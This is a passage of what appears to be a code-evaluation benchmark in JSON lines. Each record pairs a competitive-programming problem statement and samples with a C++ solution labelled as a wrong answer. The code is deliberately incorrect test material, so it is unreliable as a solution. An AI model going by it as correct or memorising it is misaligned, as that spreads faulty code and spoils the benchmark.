the snitch while it is moving along the polyline (including the end (xn,\u2009yn,\u2009zn)), print \"YES\" in the first line (without the quotes). Print in the second line t, which is the earliest moment of time, when Harry will be able to catch the snitch. On the third line print three numbers X, Y, Z, the coordinates of the point at which this happens. The absolute or relative error in the answer should not exceed 10\u2009-\u20096. If Harry is not able to catch the snitch during its moving along the described polyline, print \"NO\".","notes":null,"sample_inputs":["4\n0 0 0\n0 10 0\n10 10 0\n10 0 0\n0 0 0\n1 1\n5 5 25","4\n0 0 0\n0 10 0\n10 10 0\n10 0 0\n0 0 0\n1 1\n5 5 50","1\n1 2 3\n4 5 6\n20 10\n1 2 3"],"sample_outputs":["YES\n25.5000000000\n10.0000000000 4.5000000000 0.0000000000","NO","YES\n0.0000000000\n1.0000000000 2.0000000000 3.0000000000"]}
{"difficulty":2400,"lang":"GNU C++11","lang_cluster":"c++","src_uid":"788cb3da98fd4a56720f800588061b79","submission_id":"re_190","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <bits\/stdc++.h>\nusing namespace std;\nconst int maxn = 210;\nconst int maxm = 1010;\nint a[maxn];\nint f[maxn][maxn][maxm];\nconst int MOD = 1e9 + 7;\nint n , m;\nvoid dp(){\n\tfor(int i = 0 ; i < n ; i ++){\n\t\tfor(int j = 0 ; j <= n ; j ++){\n\t\t\tint t = (a[i + 1] - a[i]) * j;\n\t\t\tfor(int k = 0 ; k <= m - t ; k ++){\n\t\t\t\t(f[i + 1][j][k + t] += f[i][j][k] * (j + 1) % MOD) %= MOD;\n\t\t\t\tif(j != n) (f[i + 1][j + 1][k + t] += f[i][j][k]) %= MOD;\n\t\t\t\tif(j != 0) (f[i + 1][j - 1][k + t] += f[i][j][k] * j % MOD)  %= MOD;\n\t\t\t}\n\t\t}\n\t}\n}\nint main(int argc, char const *argv[])\n{\n\tcin >> n >> m;\n\tfor(int i = 1 ; i <= n ; i ++)  cin >> a[i];\n\tsort(a + 1 , a + 1 + n);\n\tf[0][0][0] = 1;\n\tdp();\n\tlong long ans = 0;\n\tfor(int i = 0 ; i <= m ; i ++){\n\t\tans += f[n][0][i];\n\t\tans %= MOD;\n\t}\n\tcout << (ans) % MOD;\n\treturn 0;\n}","description":"There are n students in a class working on group projects. The students will divide into groups (some students may be in groups alone), work on their independent pieces, and then discuss the results together. It takes the i-th student ai minutes to finish his\/her independent piece.If students work at different paces, it can be frustrating for the faster students and stressful for the slower ones. In particular, the imbalance of a group is defined as the maximum ai in the group minus the minimum ai in the group. Note that a group containing a single student has an imbalance of 0. How many ways are there for the students to divide into groups so that the total imbalance of all groups is at most k?Two divisions are considered distinct if there exists a pair of students who work in the same group in one division but different groups in the other.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u2009200, 0\u2009\u2264\u2009k\u2009\u2264\u20091000)\u00a0\u2014 the number of students and the maximum total imbalance allowed, respectively. The second line contains n space-separated integers ai (1\u2009\u2264\u2009ai\u2009\u2264\u2009500)\u00a0\u2014 the time it takes the i-th student to complete his\/her independent piece of work.","output_spec":"Print a single integer, the number of ways the students can form groups. As the answer may be large, print its value modulo 109\u2009+\u20097.","notes":"NoteIn the first sample, we have three options:   The first and second students form a group, and the third student forms a group. Total imbalance is 2\u2009+\u20090\u2009=\u20092.  The first student forms a group, and the second and third students form a group. Total imbalance is 0\u2009+\u20091\u2009=\u20091.  All three students form their own groups. Total imbalance is 0. In the third sample, the total imbalance must be 0, so each student must work individually.","sample_inputs":["3 2\n2 4 5","4 3\n7 8 9 10","4 0\n5 10 20 21"],"sample_outputs":["3","13","1"]}
{"difficulty":1800,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"7adb8bf6879925955bf187c3d05fde8c","submission_id":"217219362","tags":["dp","games","math","probabilities"],"exec_outcome":"WRONG_ANSWER","source_code":"\/**\nIf comrades that you trust gather around you, hope can take physical form and become visible. That\u00e2\u0080\u0099s what I believe.\n*\/\n#include <bits\/stdc++.h>\nusing namespace std;\n\nconst int N = 1e3 + 5;\ndouble dp[N][N];\n\nauto recurse(int w, int b) -> double\n{\n    if (w < 0 || b < 0)\n        return 0., 0;\n\n    if (dp[w][b] != -1.0)\n        return dp[w][b];\n\n    \/\/ drawing white mice directly\n    auto ans = (1.0 * w) \/ (w + b);\n\n    \/\/ win after next turn\n\n    auto nxt_b = b - 1;\n\n    auto other = (1.0 * b) \/ (w + b) * (1.0 * nxt_b) \/ (w + nxt_b);\n\n    \/\/ black mice jumps out\n    other *= 1.0 * (nxt_b - 1) \/ (w + nxt_b - 1) * recurse(w, nxt_b - 2) +\n             1.0 * w \/ (w + nxt_b - 1) * recurse(w - 1, nxt_b - 1);\n    return dp[w][b] = ans + other;\n}\n\nauto solve() -> void\n{\n    int w, b;\n    cin >> w >> b;\n    for (int i = 0; i <= w; ++i)\n        for (int j = 0; j <= b; ++j)\n            dp[i][j] = -1.0;\n\n    for (int i = 0; i <= b; ++i)\n        dp[0][i] = 0.0;\n    for (int i = 1; i <= w; ++i)\n        dp[i][0] = 1.0;\n\n    cout << fixed << setprecision(9) << recurse(w, b) << endl;\n}\n\nauto main() -> int\n{\n    ios_base::sync_with_stdio(false);\n    cin.tie(0);\n    int tc = 1;\n    while (tc--)\n    {\n        solve();\n    }\n\n    return 0;\n}\n","description":"The dragon and the princess are arguing about what to do on the New Year's Eve. The dragon suggests flying to the mountains to watch fairies dancing in the moonlight, while the princess thinks they should just go to bed early. They are desperate to come to an amicable agreement, so they decide to leave this up to chance.They take turns drawing a mouse from a bag which initially contains w white and b black mice. The person who is the first to draw a white mouse wins. After each mouse drawn by the dragon the rest of mice in the bag panic, and one of them jumps out of the bag itself (the princess draws her mice carefully and doesn't scare other mice). Princess draws first. What is the probability of the princess winning?If there are no more mice in the bag and nobody has drawn a white mouse, the dragon wins. Mice which jump out of the bag themselves are not considered to be drawn (do not define the winner). Once a mouse has left the bag, it never returns to it. Every mouse is drawn from the bag with the same probability as every other one, and every mouse jumps out of the bag with the same probability as every other one.","input_from":"standard input","output_to":"standard output","input_spec":"The only line of input data contains two integers w and b (0\u2009\u2264\u2009w,\u2009b\u2009\u2264\u20091000).","output_spec":"Output the probability of the princess winning. The answer is considered to be correct if its absolute or relative error does not exceed 10\u2009-\u20099.","notes":"NoteLet's go through the first sample. The probability of the princess drawing a white mouse on her first turn and winning right away is 1\/4. The probability of the dragon drawing a black mouse and not winning on his first turn is 3\/4 * 2\/3 = 1\/2. After this there are two mice left in the bag \u2014 one black and one white; one of them jumps out, and the other is drawn by the princess on her second turn. If the princess' mouse is white, she wins (probability is 1\/2 * 1\/2 = 1\/4), otherwise nobody gets the white mouse, so according to the rule the dragon wins.","sample_inputs":["1 3","5 5"],"sample_outputs":["0.500000000","0.658730159"]}
{"difficulty":1900,"lang":"GNU C++","lang_cluster":"c++","src_uid":"899c5b77bfc0b4b99aff310741c9c0dd","submission_id":"re_138","tags":["constructive algorithms","implementation","sortings"],"exec_outcome":"WRONG_ANSWER","source_code":"\/*\n * b.cpp\n *\n *\/\n\n#include <vector>\n#include <list>\n#include <map>\n#include <set>\n#include <deque>\n#include <stack>\n#include <queue>\n#include <bitset>\n#include <complex>\n#include <algorithm>\n#include <functional>\n#include <numeric>\n#include <utility>\n#include <limits>\n#include <sstream>\n#include <iostream>\n#include <iomanip>\n#include <cstdio>\n#include <cmath>\n#include <cstdlib>\n#include <ctime>\n\nusing namespace std;\n\n#define forn(i, n) for (int i = 0; i < (n); ++i)\n#define foreach(it, a) for (__typeof((a).begin()) it = (a).begin(); it != (a).end(); ++it)\n\nint main(void) {\n\tint n, k, p, q;\n\tcin >> n >> k;\n\tp = n \/ k;\n\tvector<int> prof(n);\n\tforn(i, n)\n\t\tcin >> prof[i];\n\tcin >> q;\n\tvector<bool> mark(n, false);\n\tdouble minProf = numeric_limits<double>::max();\n\tdouble maxProf = 0;\n\n\tforn(i, q) {\n\t\tdouble average = 0;\n\t\tforn(j, p) {\n\t\t\tint index;\n\t\t\tcin >> index;\n\t\t\t--index;\n\t\t\tmark[index] = true;\n\t\t\taverage += prof[index];\n\t\t}\n\t\taverage \/= p;\n\t\tminProf = min(minProf, average);\n\t\tmaxProf = max(maxProf, average);\n\t}\n\n\tvector<int> remaining;\n\tforn(i, n)\n\t\tif (not mark[i])\n\t\t\tremaining.push_back(prof[i]);\n\n\tint m = remaining.size();\n\tif (m >= p && m < k * p) {\n\t\tsort(remaining.begin(), remaining.end());\n\t\tdouble minMean = 0;\n\t\tdouble maxMean = 0;\n\t\tforn(i, p) {\n\t\t\tminMean += remaining[i];\n\t\t\tmaxMean += remaining[m - i - 1];\n\t\t}\n\t\tminMean \/= p;\n\t\tmaxMean \/= p;\n\t\tminProf = min(minProf, minMean);\n\t\tmaxProf = max(maxProf, maxMean);\n\t}\n\n\tprintf(\"%.10lf %.10lf\\n\", minProf, maxProf);\n\n\treturn 0;\n}\n","description":"Vasya is about to take his first university exam in about several minutes. And it's not just some ordinary exam, it's on mathematical analysis. Of course, right now Vasya can only think of one thing: what the result of his talk with the examiner will be...To prepare for the exam, one has to study proofs of n theorems. It is known that there will be k examination cards on the exam and each card contains  distinct theorems. Besides, no theorem is mentioned in more than one card (that is,  theorems won't be mentioned in any card). During the exam several students may get the same card.We do not know the exact way theorems are distributed by cards, however the students that took the exam before Vasya told him what theorems their cards contained. Vasya evaluates his level of proficiency in the i-th theorem by some number ai. The level of proficiency in some card is the average of the levels of proficiency in the theorems that are included in the card. Now Vasya wants to know the minimally and maximally possible levels of his proficiency in the card he gets on the exam. Vasya wants to determine it by the data he has collected from other students. Unfortunately, Vasya has no time left to do the math and he asked you to help him.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009k\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of theorems and the number of cards correspondingly. The second line contains n integers ai (0\u2009\u2264\u2009ai\u2009\u2264\u2009100), the i-th number (1\u2009\u2264\u2009i\u2009\u2264\u2009n) corresponds to Vasya's proficiency in the i-th theorem. The third line contains number q (0\u2009\u2264\u2009q\u2009\u2264\u2009100) \u2014 the number of people that have taken the exam before Vasya. Each of the following q lines contains the description of a student's card:  integers from 1 to n inclusive. They are the numbers of theorems included in the card in the order in which they are enumerated in the input data. The numbers are given in an arbitrary order. It is guaranteed that the given cards are valid (that is, that all theorems in one card are different and that different people get cards that either don't contain the same theorems or coincide up to the theorems' permutation).","output_spec":"Print two real numbers, representing Vasya's minimum and maximum proficiency in the card he will get on the exam. The absolute or relative error should not exceed 10\u2009-\u20096.","notes":"NoteLet's analyze the first sample. Vasya's proficiency in the cards whose content he already knows equals 6 and 15.5 correspondingly. The three theorems that are left are only enough to make one exam card. If we consider all possible variants of theorems included in the card we can see that in the best case scenario Vasya gets the card that contains theorems 4 and 7 (his proficiency would equal 15.5) and in the worst case scenario he gets theorems 3 and 5 (his proficiency would equal 5).The \u230a x\u230b operation denotes taking integer part of real number x (rounding down).","sample_inputs":["7 3\n7 15 0 19 10 5 12\n2\n1 6\n7 4","4 2\n10 8 1 17\n2\n2 3\n3 2"],"sample_outputs":["5.0000000000 15.5000000000","4.5000000000 13.5000000000"]}
{"difficulty":2400,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"98489fe54488dcfb45f8ae7b5c473d88","submission_id":"217172976","tags":["dp"],"exec_outcome":"WRONG_ANSWER","source_code":"#include <bits\/stdc++.h>\r\n#define ll long long\r\n#define MAXN 20\r\nusing namespace std;\r\nll dp[2*MAXN][MAXN],val[MAXN];\r\nint main()\r\n{\r\n    ios::sync_with_stdio(false); cin.tie(0); cout.tie(0);\r\n    ll n;\r\n    string s;\r\n    cin >> n >> s;\r\n    s=' '+s;\r\n    val[n]=1;\r\n    for (ll i=n-1;i>0;i--)\r\n        val[i]=val[i+1]*10;\r\n    for (ll i=1;i<=2*n;i++)\r\n    {\r\n        for (ll j=0;j<=n;j++)\r\n        {\r\n            if (j)\r\n                dp[i][j]=max(dp[i][j],dp[i-1][j-1]+val[j]*(s[i]-'0'));\r\n            if (j<i && i-j<=n)\r\n                dp[i][j]=max(dp[i][j],dp[i-1][j]+val[i-j]*(s[i]-'0'));\r\n        }\r\n    }\r\n    string ans=\"\";\r\n    ll i=2*n,j=n;\r\n    while (true)\r\n    {\r\n        if (!i)\r\n            break;\r\n        if (dp[i][j]==dp[i-1][j]+val[i-j]*(s[i]-'0'))\r\n        {\r\n            ans='H'+ans;\r\n            i--;\r\n        }\r\n        else\r\n        {\r\n            ans='M'+ans;\r\n            i--;\r\n            j--;\r\n        }\r\n    }\r\n    cout << ans;\r\n    return 0;\r\n}\r\n","description":"There is a new TV game on BerTV. In this game two players get a number A consisting of 2n digits. Before each turn players determine who will make the next move. Each player should make exactly n moves. On it's turn i-th player takes the leftmost digit of A and appends it to his or her number Si. After that this leftmost digit is erased from A. Initially the numbers of both players (S1 and S2) are \u00abempty\u00bb. Leading zeroes in numbers A,\u2009S1,\u2009S2 are allowed. In the end of the game the first player gets S1 dollars, and the second gets S2 dollars.One day Homer and Marge came to play the game. They managed to know the number A beforehand. They want to find such sequence of their moves that both of them makes exactly n moves and which maximizes their total prize. Help them.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u200918). The second line contains integer A consisting of exactly 2n digits. This number can have leading zeroes.","output_spec":"Output the line of 2n characters \u00abH\u00bb and \u00abM\u00bb \u2014 the sequence of moves of Homer and Marge, which gives them maximum possible total prize. Each player must make exactly n moves. If there are several solutions, output any of them.","notes":null,"sample_inputs":["2\n1234","2\n9911"],"sample_outputs":["HHMM","HMHM"]}
{"difficulty":2500,"lang":"GNU C++17","lang_cluster":"c++","src_uid":"a14739b86d1fd62a030226263cdc1afc","submission_id":"92014216","tags":["brute+force"],"exec_outcome":"WRONG_ANSWER","source_code":"#include<algorithm>\r\n#include<iostream>\r\n#include<cstring>\r\n#include<cstdio>\r\n#include<string>\r\n#include<cmath>\r\n#include<map>\r\n#include<queue>\r\n#include<set>\r\n#include<stack>\r\n#include<vector>\r\n#include<complex>\r\n#include<iomanip>\r\n#include<unordered_map>\r\n#define deg(x) cerr<<#x<<\"=\"<<x<<endl;\r\n#define fd(x) for(int i=0;i<x;i++)\r\n#define fdd(a,x) for(int i=a;i<x;i++)\r\n#define fx(x,n) for(int i=n-1;i>=x;i--)\r\n#define mst(x) memset(x,0,sizeof(x));\r\n#define fi first\r\n#define se second\r\n#define TB ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);\r\n#define ok \"ok\"\r\n#define HH puts(\"\");\r\n#define ls rt<<1\r\n#define rs rt<<1|1\r\n#define pb(a,b) a.push_back(b);\r\n#define FIN  freopen(\"1.in\",\"r\",stdin);\r\n#define FOUT freopen(\"1.out\",\"w\",stdout);\r\nusing namespace std;\r\ntypedef long long ll;typedef long long LL;\r\ntypedef pair<int,int> pii;\r\ntypedef pair<ll,ll> pll;\r\ntypedef pair<string,int> pss;\r\ntypedef unsigned long long ull;\r\nconst ll mod=998244353;\r\nconst int inf=1e9+7;\r\nconst double eps=1e-8;\r\nll qpow(ll a,ll b,ll m){ ll r=1;a%=m;for(;b;b>>=1){if(b&1)r=r*a%m;a=a*a%m;}return (r+m)%m;}\r\n\/\/const double pi=acos(-1);\r\n \r\nconst int maxn=45;\r\nint vis[55][55][55][4][4][4];\/\/\u00e6\u00a0\u0087\u00e8\u00ae\u00b0\u00e6\u0095\u00b0\u00e7\u00bb\u0084\u00ef\u00bc\u008c[A\u00e5\u009d\u0090\u00e6\u00a0\u0087][B\u00e5\u009d\u0090\u00e6\u00a0\u0087][C\u00e5\u009d\u0090\u00e6\u00a0\u0087][A\u00e6\u0093\u008d\u00e4\u00bd\u009c\u00e7\u008a\u00b6\u00e6\u0080\u0081][B\u00e6\u0093\u008d\u00e4\u00bd\u009c\u00e7\u008a\u00b6\u00e6\u0080\u0081][C\u00e6\u0093\u008d\u00e4\u00bd\u009c\u00e7\u008a\u00b6\u00e6\u0080\u0081]\r\nint a[4][4];\r\nint ans=0;\r\n \r\nint dfs(int x1,int x2,int x3,int A,int B,int C){\r\n\t\/\/\u00e5\u008f\u0082\u00e6\u0095\u00b0\u00e5\u0090\u008cvis\u00ef\u00bc\u008c[A\u00e5\u009d\u0090\u00e6\u00a0\u0087][B\u00e5\u009d\u0090\u00e6\u00a0\u0087][C\u00e5\u009d\u0090\u00e6\u00a0\u0087][A\u00e6\u0093\u008d\u00e4\u00bd\u009c\u00e7\u008a\u00b6\u00e6\u0080\u0081][B\u00e6\u0093\u008d\u00e4\u00bd\u009c\u00e7\u008a\u00b6\u00e6\u0080\u0081][C\u00e6\u0093\u008d\u00e4\u00bd\u009c\u00e7\u008a\u00b6\u00e6\u0080\u0081]\r\n    if(vis[x1][x2][x3][A][B][C]) return 0;\r\n    vis[x1][x2][x3][A][B][C]=1;\r\n    int b[4]={x1,x2,x3};\/\/\u00e8\u00ae\u00b0\u00e5\u00bd\u0095\u00e6\u00af\u008f\u00e4\u00ba\u00ba\u00e5\u00bd\u0093\u00e5\u0089\u008d\u00e5\u009d\u0090\u00e6\u00a0\u0087\u00ef\u00bc\u008c\u00e5\u00bc\u0080\u00e4\u00b8\u00aa\u00e6\u0095\u00b0\u00e7\u00bb\u0084\u00e4\u00b8\u00bb\u00e8\u00a6\u0081\u00e6\u0098\u00af\u00e5\u00a5\u00bd\u00e9\u0081\u008d\u00e5\u008e\u0086\r\n    int c[4]={A,B,C};\/\/\u00e6\u00af\u008f\u00e4\u00ba\u00ba\u00e6\u0093\u008d\u00e4\u00bd\u009c\u00e7\u008a\u00b6\u00e6\u0080\u0081\u00ef\u00bc\u008c\u00e5\u0090\u008c\u00e6\u00a0\u00b7\u00e6\u0098\u00af\u00e6\u0096\u00b9\u00e4\u00be\u00bf\u00e9\u0081\u008d\u00e5\u008e\u0086\r\n    int g[50]={0};\/\/\u00e5\u009d\u0090\u00e6\u00a0\u0087\u00e8\u00bd\u00b4\u00e7\u008a\u00b6\u00e6\u0080\u0081\u00ef\u00bc\u008cg[x]=i\u00e8\u00a1\u00a8\u00e7\u00a4\u00bax\u00e4\u00bd\u008d\u00e7\u00bd\u00ae\u00e4\u00b8\u008a\u00e7\u00ab\u0099\u00e7\u009d\u0080\u00e7\u00ac\u00aci\u00e4\u00b8\u00aa\u00e4\u00ba\u00ba\r\n\t\/\/\u00e5\u0085\u00b6\u00e5\u00ae\u009e\u00e5\u00af\u00b9\u00e4\u00ba\u008e\u00e5\u0090\u009e\u00e6\u008e\u0089\u00e7\u009a\u0084\u00e7\u008a\u00b6\u00e6\u0080\u0081\u00e5\u00ba\u0094\u00e8\u00af\u00a5\u00e9\u00a2\u009d\u00e5\u00a4\u0096\u00e5\u00bc\u0080\u00e4\u00b8\u00aa\u00e6\u0095\u00b0\u00e7\u00bb\u0084\u00ef\u00bc\u008c\u00e4\u00bd\u0086\u00e6\u0098\u00af\u00e6\u0088\u0091\u00e6\u0087\u0092\u00ef\u00bc\u008c\u00e6\u0089\u0080\u00e4\u00bb\u00a5\u00e6\u0088\u0091\u00e7\u0094\u00a8g[maxn+i]\u00e8\u00a1\u00a8\u00e7\u00a4\u00ba\u00e7\u00ac\u00aci\u00e4\u00b8\u00aa\u00e4\u00ba\u00ba\u00e4\u00b8\u00be\u00e8\u00b5\u00b7\u00e7\u009a\u0084\u00e4\u00ba\u00ba\r\n\t\/\/\u00e4\u00b9\u009f\u00e5\u00b0\u00b1\u00e6\u0098\u00afg[maxn+i]=q\u00e8\u00a1\u00a8\u00e7\u00a4\u00ba\u00e7\u00ac\u00aci\u00e4\u00b8\u00aa\u00e4\u00ba\u00ba\u00e6\u00ad\u00a3\u00e5\u0090\u00ab\u00e7\u009d\u0080\u00e7\u00ac\u00acq\u00e4\u00b8\u00aa\u00e4\u00ba\u00ba\r\n\t\/\/g[x]\u00e4\u00b8\u00ba0\u00e8\u0087\u00aa\u00e7\u0084\u00b6\u00e6\u0098\u00af\u00e6\u00b2\u00a1\u00e4\u00ba\u00ba\u00e7\u00ab\u0099\/\u00e4\u00b8\u008d\u00e4\u00b8\u00be\r\n    for(int i=0;i<3;i++) g[b[i]]=i;\r\n    for(int i=0;i<3;i++){\r\n        int t=b[i];\/\/\u00e6\u009e\u009a\u00e4\u00b8\u00be\u00e5\u00bd\u0093\u00e5\u0089\u008d\u00e5\u009d\u0090\u00e6\u00a0\u0087\r\n        if(t<maxn){\/\/\u00e6\u008a\u008a\u00e8\u00bf\u0099\u00e4\u00b8\u00aaif\u00e5\u0088\u00a0\u00e6\u008e\u0089\u00e5\u00b0\u00b1t\u00e5\u0087\u00ba\u00e5\u00a4\u00a9\u00e9\u0099\u0085\u00ef\u00bc\u008c\u00e6\u009c\u00ac\u00e4\u00bb\u00a3\u00e7\u00a0\u0081\u00e5\u0094\u00af\u00e4\u00b8\u0080\u00e5\u0089\u00aa\u00e6\u009e\u009d\r\n            ans=max(ans,t);\r\n            if(!(c[i]&1)&&!g[maxn+i]){\/\/c[i]&1\u00e6\u0098\u00af0\u00ef\u00bc\u008c\u00e5\u0088\u0099\u00e7\u00ac\u00aci\u00e4\u00ba\u00ba\u00e6\u00b2\u00a1\u00e7\u00a7\u00bb\u00e5\u008a\u00a8\u00e8\u00bf\u0087\u00ef\u00bc\u008cg[maxn+i]\u00e4\u00b8\u00ba0\u00e8\u00a1\u00a8\u00e7\u00a4\u00ba\u00e8\u00bf\u0099\u00e4\u00ba\u00ba\u00e6\u00b2\u00a1\u00e5\u0090\u009e\u00e5\u0088\u00ab\u00e4\u00ba\u00ba\u00ef\u00bc\u008c\u00e5\u008f\u00af\u00e4\u00bb\u00a5\u00e7\u00a7\u00bb\u00e5\u008a\u00a8\r\n                for(int j=max(0,t-a[i][1]);j<=t+a[i][1];j++){\r\n                    if(j>0&&!g[j]){\r\n                        b[i]=j;c[i]^=1;\r\n                        dfs(b[0],b[1],b[2],c[0],c[1],c[2]);\r\n                        b[i]=t;c[i]^=1;\r\n                    }\r\n                }\r\n            }\r\n            if(!(c[i]&2)&&!g[maxn+i]){\r\n                for(int j=0;j<3;j++){\r\n                    int v=b[j];\r\n                    if(abs(t-v)!=1) continue;\r\n                    b[j]=maxn+i;c[i]^=2;\r\n                    dfs(b[0],b[1],b[2],c[0],c[1],c[2]);\r\n                    b[j]=v;c[i]^=2;\r\n                }\r\n            }\r\n            if(g[maxn+i]){\r\n                int k=g[maxn+i];\r\n                for(int j=max(0,t-a[i][2]);j<=t+a[i][2];j++){\r\n                    if(j>0&&!g[j]){\r\n                        b[k]=j;\r\n                        dfs(b[0],b[1],b[2],c[0],c[1],c[2]);\r\n                        b[k]=maxn+i;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n \r\nint main()\r\n{\r\n    fd(3)\r\n        for(int j=0;j<3;j++)\r\n            cin>>a[i][j];\r\n    dfs(a[0][0],a[1][0],a[2][0],0,0,0);\r\n    cout<<ans<<'\\n';\r\n    return 0;\r\n}","description":"You are given a straight half-line divided into segments of unit length, which we will call positions. The positions are numbered by positive integers that start with 1 from the end of half-line, i. e. 1, 2, 3 and so on. The distance between the positions is the absolute difference between the respective numbers. Laharl, Etna and Flonne occupy some positions on the half-line and they want to get to the position with the largest possible number. They are originally placed in different positions. Each of the characters can perform each of the following actions no more than once:   Move a certain distance.  Grab another character and lift him above the head.  Throw the lifted character a certain distance.  Each character has a movement range parameter. They can only move to free positions, assuming that distance between those positions doesn't exceed the movement range. One character can lift another character if the distance between the two characters equals 1, and no one already holds that another character. We can assume that the lifted character moves to the same position as the person who has lifted him, and the position in which he stood before becomes free. A lifted character cannot perform any actions and the character that holds him cannot walk. Also, each character has a throwing range parameter. It is the distance at which this character can throw the one lifted above his head. He can only throw a character to a free position, and only when there is a lifted character. We accept the situation when one person grabs another one who in his turn has the third character in his hands. This forms a \"column\" of three characters. For example, Laharl can hold Etna while Etna holds Flonne. In this case, Etna and the Flonne cannot perform any actions, and Laharl can only throw Etna (together with Flonne) at some distance. Laharl, Etna and Flonne perform actions in any order. They perform actions in turns, that is no two of them can do actions at the same time.Determine the maximum number of position at least one of the characters can reach. That is, such maximal number x so that one of the characters can reach position x.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers: Laharl's position, his movement range and throwing range. The second and the third lines describe Etna's and Flonne's parameters correspondingly in the similar form. It is guaranteed that the three characters occupy distinct positions. All numbers in the input are between 1 and 10, inclusive.","output_spec":"Print a single number \u2014 the maximum ordinal number of position which either Laharl, Etna or Flonne can reach.","notes":"NoteLet us explain how to reach position 15 in the sample.Initially Laharl occupies position 9, Etna \u2014 position 4 and Flonne \u2014 position 2.First Laharl moves to position 6.Then Flonne moves to position 5 and grabs Etna.Laharl grabs Flonne and throws to position 9.Flonne throws Etna to position 12.Etna moves to position 15.","sample_inputs":["9 3 3\n4 3 1\n2 3 3"],"sample_outputs":["15"]}
{"difficulty":1600,"lang":"GNU C++11","lang_cluster":"c++","src_uid":"a17bac596b1f060209534cbffdf0f40e","submission_id":"re_20","tags":["implementation","strings"],"exec_outcome":"WRONG_ANSWER","source_code":"\/\/In The Name Of God ( Of programming )\n\n#include <bits\/stdc++.h>\n\nusing namespace std;\n\ntypedef long long ll;\ntypedef long double ld;\n\nconst ll Maxn = 1e3 + 7;\nconst ll Max = 1e3 + 7;\nconst ll Mod = 1e9 + 7;\nconst ll Inf = 1e9 + 7;\n\n#define pb push_back\n#define mp make_pair\n#define F first\n#define S second\n#define P_ll pair<ll, ll>\n#define P_cl pair<char, ll>\n#define P_lc pair<ll, char>\n#define Sort( a ) sort ( a.begin(), a.end() )\n#define help_me_God ios_base::sync_with_stdio ( false )\n\nstring s[Maxn], V[Maxn];\nll ans[5];\n\nll check ( char t )\n{\n    if ( t == 'u' || t == 'o' || t == 'a' || t == 'i' || t == 'e' )\n        return true;\n    return false;\n}\n\nvoid f ( ll a, ll b, ll c, ll d )\n{\n    if ( V[a] == V[b] && V[c] == V[d] );\n    else    ans[1] = 0;\n    if ( V[a] == V[c] && V[b] == V[d] );\n    else    ans[2] = 0;\n    if ( V[a] == V[d] && V[c] == V[b] );\n    else    ans[3] = 0;\n    if ( V[a] == V[b] && V[c] == V[d] && V[c] == V[b] );\n    else    ans[4] = 0;\n}\n\nvoid print ( ll i )\n{\n    if ( i == 1 )\n        cout << \"aabb\" << endl;\n    if ( i == 2 )\n        cout << \"abab\" << endl;\n    if ( i == 3 )\n        cout << \"abba\" << endl;\n    if ( i == 4 )\n        cout << \"aaaa\" << endl;\n}\n\nint main()\n{\n    ll n, k;\n    cin >> n >> k;\n    for ( ll i = 1; i <= 4 * n; i++ )\n    {\n        cin >> s[i];\n        ll K = k;\n        for ( ll j = s[i].size() - 1; K && j >= 0; j-- )\n        {\n            if ( check ( s[i][j] ) )\n                V[i] += s[i][j], K--;\n        }\n        if ( K )\n        {\n            cout << \"NO\" << endl;\n            return 0;\n        }\n    }\n    ans[1] = ans[2] = ans[3] = ans[4] = 1;\n    for ( ll i = 1; i <= n; i++ )\n    {\n        ll st = ( i - 1 ) * 4;\n        f ( st + 1, st + 2, st + 3, st + 4 );\n    }\n    for ( ll i = 4; i >= 1; i-- )\n    {\n        if ( ans[i] )\n        {\n            print ( i );\n            return 0;\n        }\n    }\n    cout << \"NO\" << endl;\n    return 0;\n}\n","description":"Vera adores poems. All the poems Vera knows are divided into quatrains (groups of four lines) and in each quatrain some lines contain rhymes.Let's consider that all lines in the poems consist of lowercase Latin letters (without spaces). Letters \"a\", \"e\", \"i\", \"o\", \"u\" are considered vowels.Two lines rhyme if their suffixes that start from the k-th vowels (counting from the end) match. If a line has less than k vowels, then such line can't rhyme with any other line. For example, if k\u2009=\u20091, lines commit and hermit rhyme (the corresponding suffixes equal it), and if k\u2009=\u20092, they do not rhyme (ommit\u2009\u2260\u2009ermit).Today on a literature lesson Vera learned that quatrains can contain four different schemes of rhymes, namely the following ones (the same letters stand for rhyming lines):   Clerihew (aabb);  Alternating (abab);  Enclosed (abba). If all lines of a quatrain pairwise rhyme, then the quatrain can belong to any rhyme scheme (this situation is represented by aaaa).If all quatrains of a poem belong to the same rhyme scheme, then we can assume that the whole poem belongs to this rhyme scheme. If in each quatrain all lines pairwise rhyme, then the rhyme scheme of the poem is aaaa. Let us note that it doesn't matter whether lines from different quatrains rhyme with each other or not. In other words, it is possible that different quatrains aren't connected by a rhyme.Vera got a long poem as a home task. The girl has to analyse it and find the poem rhyme scheme. Help Vera cope with the task.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n\u2009\u2264\u20092500, 1\u2009\u2264\u2009k\u2009\u2264\u20095)\u00a0\u2014 the number of quatrains in the poem and the vowel's number, correspondingly. Next 4n lines contain the poem. Each line is not empty and only consists of small Latin letters. The total length of the lines does not exceed 104. If we assume that the lines are numbered starting from 1, then the first quatrain contains lines number 1, 2, 3, 4; the second one contains lines number 5, 6, 7, 8; and so on.","output_spec":"Print the rhyme scheme of the poem as \"aabb\", \"abab\", \"abba\", \"aaaa\"; or \"NO\" if the poem does not belong to any of the above mentioned schemes.","notes":"NoteIn the last sample both quatrains have rhymes but finding the common scheme is impossible, so the answer is \"NO\".","sample_inputs":["1 1\nday\nmay\nsun\nfun","1 1\nday\nmay\ngray\nway","2 1\na\na\na\na\na\na\ne\ne","2 1\nday\nmay\nsun\nfun\ntest\nhill\nfest\nthrill"],"sample_outputs":["aabb","aaaa","aabb","NO"]}
